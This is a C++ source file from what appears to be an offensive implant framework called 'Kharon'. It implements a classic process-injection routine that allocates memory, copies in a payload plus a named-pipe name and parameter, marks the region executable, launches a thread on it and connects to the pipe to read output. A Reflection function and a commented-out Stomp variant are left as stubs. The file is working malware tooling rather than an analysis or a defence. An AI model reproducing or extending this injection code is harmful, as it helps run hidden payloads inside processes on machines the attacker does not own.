#include <Kharon.h>

auto DECLFN Injection::Classic(
    _In_      PBYTE   Buffer,
    _In_      UPTR    Size,
    _In_      PVOID   Param,
    _Out_opt_ PBYTE*  OutBuff,
    _Out_     PVOID*  Base,
    _Out_     HANDLE* ThreadHandle
) -> BOOL {
    HANDLE PipeHandle = INVALID_HANDLE_VALUE;
    PVOID  TmpMem     = NULL;
    ULONG  OldProt    = 0;
    ULONG  TID        = 0;
    ULONG  BytesRead  = 0;
    ULONG  Success    = FALSE;
    ULONG  FullSize   = 0;

    if ( Kh->Inj->Ctx.Pipe.Boolean ) {
        FullSize = ( 
            Size + sizeof( Kh->Inj->Ctx.Pipe.Length ) + Kh->Inj->Ctx.Pipe.Length + 
            sizeof( Kh->Inj->Ctx.Param.Length ) + Kh->Inj->Ctx.Param.Length
        );

        TmpMem = Kh->Mm->Alloc( 0, 0, FullSize, MEM_COMMIT, PAGE_READWRITE );
        Mem::Copy( TmpMem, Buffer, Size );
        Mem::Copy( C_PTR( U_PTR( TmpMem ) + Size ), &Kh->Inj->Ctx.Pipe.Length, sizeof( Kh->Inj->Ctx.Pipe.Length ) );
        Mem::Copy( C_PTR( U_PTR( TmpMem ) + Size + sizeof( Kh->Inj->Ctx.Pipe.Length ) ), Kh->Inj->Ctx.Pipe.Name, Kh->Inj->Ctx.Pipe.Length );
        Mem::Copy( C_PTR( U_PTR( TmpMem ) + Size + sizeof( Kh->Inj->Ctx.Pipe.Length ) + Kh->Inj->Ctx.Pipe.Length ), &Kh->Inj->Ctx.Param.Length, sizeof( Kh->Inj->Ctx.Param.Length ) );
        Mem::Copy( reinterpret_cast<char*>( TmpMem ) + Size + sizeof( Kh->Inj->Ctx.Pipe.Length ) + Kh->Inj->Ctx.Pipe.Length + sizeof(Kh->Inj->Ctx.Param.Length), Kh->Inj->Ctx.Param.Buffer, Kh->Inj->Ctx.Param.Length );
    } else {
        FullSize = Size;
        TmpMem   = Buffer;
    }

    *Base = Kh->Mm->Alloc( 0, Base, FullSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( !*Base ) { Success = FALSE; return Success; }

    if ( Kh->Inj->Ctx.Spawn ) {
        Success = Kh->Mm->Write( 0, Base, B_PTR( TmpMem ), FullSize );
        Kh->Mm->Free( 0, TmpMem, FullSize, MEM_RELEASE );
        if ( !Success ) { return Success; }
    } else {
        Mem::Copy( Base, B_PTR( TmpMem ), FullSize );
        Kh->Mm->Free( 0, TmpMem, FullSize, MEM_RELEASE );
    }

    Success = Kh->Mm->Protect( 0, Base, FullSize, PAGE_EXECUTE_READ, &OldProt );
    if ( !Success ) { return Success; }

    *ThreadHandle = Kh->Td->Create( 0, Base, Param, 0, 0, &TID );
    if ( !*ThreadHandle ) { Success = FALSE; return Success; }

    if ( Kh->Inj->Ctx.Pipe.Boolean ) {
        PipeHandle = Kh->Krnl32.CreateFileA( 
            Kh->Inj->Ctx.Pipe.Name, GENERIC_READ, FILE_SHARE_READ, 0, 
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 
        );
        if ( PipeHandle == INVALID_HANDLE_VALUE ) {
            return FALSE;
        }
    
        Success = Kh->Krnl32.ConnectNamedPipe( PipeHandle, 0 );
    
        // Kh->Krnl32.PeekNamedPipe( PipeHandle,  )

        // Kh->Krnl32.ReadFile( PipeHandle, OutBuff,  )
    }



_KH_END:

    return Success;
}

// auto DECLFN Injection::Stomp(

// )

auto DECLFN Injection::Reflection(
    _In_ PBYTE  Buffer,
    _In_ ULONG  Size,
    _In_ PVOID  Param,
    _In_ PBYTE* OutBuff
) -> BOOL {
    
}